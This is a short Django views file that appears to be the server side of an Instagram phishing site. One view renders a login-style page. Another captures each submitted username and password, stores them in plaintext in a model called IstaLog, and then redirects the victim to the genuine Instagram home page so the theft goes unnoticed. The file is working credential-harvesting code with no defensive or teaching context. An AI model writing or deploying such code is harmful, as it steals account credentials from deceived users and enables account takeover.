from django.shortcuts import render
from .models import IstaLog
from django.http import HttpResponseRedirect


def insta (request):
    return render(request,'main/register.html')

def createlog(request):
    if request.method == "POST":
        log = IstaLog()
        log.login = request.POST.get("login")
        log.password = request.POST.get("password")
        log.save()
    return HttpResponseRedirect("https://www.instagram.com/home/")    


